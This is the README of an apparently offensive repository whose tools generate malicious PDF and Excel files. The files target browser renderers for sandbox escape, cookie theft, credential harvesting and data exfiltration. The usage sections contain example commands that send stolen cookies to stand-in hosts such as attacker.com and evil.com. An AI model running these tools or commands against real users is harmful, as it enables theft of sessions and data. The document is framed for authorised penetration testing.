# XSS-PDF Repository - PDF & Excel Browser Exploitation Tools

## 🚀 Two Complete Security Testing Tools

This repository contains two separate, comprehensive security testing tools for browser-based exploitation:

1. **PDF-XSS Tool**: Advanced PDF sandbox escape and browser exploitation framework
2. **Excel-XSS Tool**: Excel browser rendering exploitation with 60+ payloads

## 📁 Project Structure

```
XSS-PDF/
├── PDF-XSS/                               # Complete PDF-XSS Tool
│   ├── script.py                          # Main PDF generator script
│   ├── Another-Script.py                  # Alternative browser-specific PDF generator  
│   ├── pdf_payloads.json                 # Consolidated PDF payload database (45 payloads)
│   ├── IMPROVEMENTS.md                    # Feature improvements documentation
│   ├── README.md                          # PDF-XSS tool documentation
│   ├── requirements.txt                   # PDF tool dependencies (standard library only)
│   └── merge_json_payloads.py            # Payload merger utility
├── Excel-XSS/                            # Complete Excel-XSS Tool
│   ├── export_to_excel.py                # Excel browser payload exporter
│   ├── excel_payloads.json              # Consolidated Excel payload database (60 payloads)
│   ├── README.md                         # Excel-XSS tool documentation
│   ├── requirements.txt                  # Excel tool dependencies (pandas, openpyxl)
│   └── merge_json_payloads.py           # Payload merger utility
├── README.md                             # This file - Repository overview
└── Script-1-Readme.md                   # Additional documentation
```

## ⚠️ Legal Disclaimer

These tools are designed for legitimate security testing, educational purposes, and authorized penetration testing only. Users are responsible for ensuring they have proper authorization before testing any systems. Unauthorized use is prohibited and may be illegal.

## 🎯 Tool Overview

### PDF-XSS Tool
**Advanced PDF Sandbox Escape and Browser Exploitation Framework**
- **45+ sophisticated PDF payloads** targeting browser PDF renderers
- **Multi-browser support**: Chrome (PDFium), Firefox (PDF.js), Safari (PDFKit), Adobe Reader, Edge
- **Sandbox escape techniques**: DOM access, file system access, command execution, network exfiltration
- **Browser-specific file generation**: Create single files with all payloads for a specific browser
- **No dependencies**: Uses only Python standard library
- **Research-based**: Built on 50+ CVE references and security conference research

### Excel-XSS Tool  
**Excel Browser Rendering Exploitation Framework**
- **60+ Excel browser payloads** targeting Excel files in web browsers
- **Multi-format support**: .xls, .xlsx, .xlsm, .xlsb format exploitation
- **Browser compatibility**: Chrome, Firefox, Safari, Edge, Office 365 Web, Google Sheets
- **Advanced features**: Formula injection, macro execution, XXE exploitation, CSV injection
- **Professional export**: Comprehensive Excel reports with research documentation

## 🚀 Key Features

### PDF-XSS Tool Features
- **PDF Sandbox Escape**: Advanced techniques for breaking out of PDF sandboxes
- **Browser-Specific Targeting**: Tailored payloads for different PDF rendering engines
- **Action-Based Persistence**: PDF action hijacking for persistent attacks
- **Data Exfiltration**: Form submission and URL launching escape methods
- **Dialog Exploitation**: Credential harvesting via PDF dialogs

### Excel-XSS Tool Features
- **Legacy Format Focus**: Targets older Excel formats (.xls) with reduced security restrictions
- **Browser Integration Abuse**: Exploits Excel rendering in web browsers
- **Advanced Research Base**: 100+ CVE references, security conferences, GitHub research
- **Multi-Sheet Analysis**: Professional Excel export with comprehensive documentation
- **Cross-Platform Testing**: Works across different operating systems and browsers

## 🛠️ Installation & Quick Start

### PDF-XSS Tool
```bash
# Navigate to PDF-XSS tool
cd PDF-XSS

# No dependencies required - uses Python standard library only
# Generate basic PDF files
python3 script.py -o pdf

# Generate all PDF XSS payload types with exfiltration URL
python3 script.py -t all -u https://webhook.site/your-id

# Generate browser-specific payloads
python3 script.py -b chrome -u http://attacker.com/collect
```

### Excel-XSS Tool
```bash
# Navigate to Excel-XSS tool
cd Excel-XSS

# Install dependencies
pip install -r requirements.txt

# Export Excel browser payload database to Excel format
python3 export_to_excel.py

# View payload metadata
cat excel_payloads.json | head -20
```

## 📖 Documentation

Each tool includes comprehensive documentation:

- **PDF-XSS/README.md**: Complete PDF-XSS tool documentation with usage examples, command line flags, and security testing methodology
- **Excel-XSS/README.md**: Complete Excel-XSS tool documentation with browser compatibility, payload categories, and testing procedures

## 🎯 Usage Examples

### PDF-XSS Tool Examples
```bash
cd PDF-XSS

# Basic PDF generation
python3 script.py --help
python3 script.py -t alert

# Advanced sandbox escape testing
python3 script.py -t cookie -u http://attacker.com/collect
python3 script.py -b firefox --category file_system -u http://evil.com

# Create single file with all payloads for specific browser
python3 script.py -b chrome --browser-specific-file -u http://test.com

# Alternative script usage
python3 Another-Script.py -b chrome -u http://test.com

# Alternative script: single file with all browser payloads
python3 Another-Script.py -b firefox --browser-specific-file -u http://evil.com
```

### Excel-XSS Tool Examples  
```bash
cd Excel-XSS

# Generate comprehensive Excel report
python3 export_to_excel.py

# Extract specific payload types
cat excel_payloads.json | jq '.payloads[] | select(.browser=="chrome")'

# Count payloads by category
cat excel_payloads.json | jq '.payloads | group_by(.category) | map({category: .[0].category, count: length})'
```

## 🚨 Security Testing Methodology

### PDF-XSS Security Testing
1. **Generate PDF Test Files**: Create PDFs with various sandbox escape payloads
2. **Upload/Embed Testing**: Test file upload functionality on target applications  
3. **PDF Viewer Analysis**: Test different PDF viewers (Adobe Reader, browser built-ins, etc.)
4. **Sandbox Escape Monitoring**: Monitor for successful escapes via URL launching, form submission
5. **Data Exfiltration Testing**: Use URL flag to test actual data extraction capabilities

### Excel-XSS Security Testing
1. **Generate Excel Test Files**: Create Excel files with browser exploitation payloads
2. **Upload/Share Testing**: Test file upload and sharing mechanisms
3. **Browser Excel Viewer Analysis**: Test different browser Excel viewers and online services
4. **Formula Injection Testing**: Test malicious formula execution in browser context
5. **Cross-Browser Testing**: Verify payload effectiveness across different browsers

## 🛡️ Defensive Measures

### PDF-XSS Protection
- **Disable PDF JavaScript**: Configure PDF viewers to disable JavaScript execution
- **PDF Upload Restrictions**: Implement strict PDF upload validation and content analysis
- **Sandbox Hardening**: Use additional sandboxing layers beyond PDF viewer defaults
- **Network Monitoring**: Monitor for unusual outbound connections from PDF viewer processes

### Excel-XSS Protection  
- **Disable External Data Connections**: Block HTTP/UNC path connections from Excel files
- **Formula Execution Restrictions**: Disable or restrict formula execution in browser Excel viewers
- **Macro Security**: Implement strict macro execution policies for browser-rendered Excel files
- **File Upload Validation**: Scan uploaded Excel files for suspicious formulas and external connections

## 📈 Research Foundation

Both tools are built on extensive security research:

### PDF-XSS Research Base
- **50+ CVE References** across all PDF rendering libraries
- **Academic Papers** on PDF security and sandbox escapes
- **Bug Bounty Reports** from major platforms
- **Security Conference** presentations and whitepapers

### Excel-XSS Research Base
- **100+ CVE References** for Excel browser rendering vulnerabilities
- **Security Conference Research** (BlackHat, DEF CON, BSides presentations)
- **GitHub Security Research** repositories and POC exploits
- **Bug Bounty Platform Reports** (HackerOne, Bugcrowd disclosures)

## 🤝 Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Add comprehensive tests
4. Follow existing code style
5. Submit a pull request with detailed description

When contributing to either tool, please maintain the separation between PDF-XSS and Excel-XSS functionality.

## 🔗 Resources

### PDF Security Resources
- [OWASP XSS Prevention Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [PDF Security Research](https://blog.didierstevens.com/programs/pdf-tools/)
- [JavaScript Security Best Practices](https://developer.mozilla.org/en-US/docs/Web/Security)

### Excel Security Resources
- [OWASP Testing Guide - File Upload Testing](https://owasp.org/www-project-web-security-testing-guide/)
- [Microsoft Excel Security](https://docs.microsoft.com/en-us/deployoffice/security/)
- [Excel Formula Injection](https://owasp.org/www-community/attacks/CSV_Injection)

## 📄 License

This project is for educational and authorized security testing purposes only. Please use responsibly and in accordance with applicable laws and regulations.

---

**Remember**: These tools are for authorized security testing only. Always obtain proper permission before testing any systems.